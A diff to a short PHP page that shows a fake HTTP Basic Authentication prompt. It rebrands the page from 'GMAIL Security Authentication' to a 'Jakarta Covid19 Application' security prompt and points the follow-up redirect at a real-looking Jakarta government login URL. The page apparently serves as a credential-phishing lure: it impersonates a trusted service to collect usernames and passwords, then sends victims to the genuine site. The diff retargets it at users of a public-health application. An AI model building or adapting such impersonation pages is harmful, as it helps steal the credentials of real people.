@@ -1,14 +1,14 @@
 <?php
 if (empty($_SERVER['PHP_AUTH_USER'])) {
-    header('WWW-Authenticate: Basic realm="GMAIL Security Authentication"');
+    header('WWW-Authenticate: Basic realm="Jakarta Covid19 Application Security Authentication"');
     header('HTTP/1.0 401 Unauthorized');
    	echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <HTML>
 <HEAD>
-<TITLE>GMAIL Security Authentication</TITLE>
+<TITLE>Jakarta Covid19 Application Security Authentication</TITLE>
 <META 
      HTTP-EQUIV="Refresh"
-     CONTENT="1; URL=https://mail.google.com/mail/">
+     CONTENT="1; URL=https://jakevo.jakarta.go.id/login">
 </HEAD>
 <BODY>
 <b>Authentication failed. Please try again</b>
